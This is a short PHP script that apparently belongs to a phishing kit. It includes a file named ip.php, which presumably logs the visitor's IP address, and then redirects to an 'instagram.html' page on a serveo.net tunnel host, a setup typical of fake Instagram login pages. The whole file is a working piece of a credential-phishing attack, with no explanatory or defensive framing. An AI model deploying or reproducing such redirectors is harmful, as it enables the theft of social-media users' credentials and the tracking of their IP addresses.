<?php
include 'ip.php';
header('Location: https://templum.serveo.net/instagram.html');
exit
?>
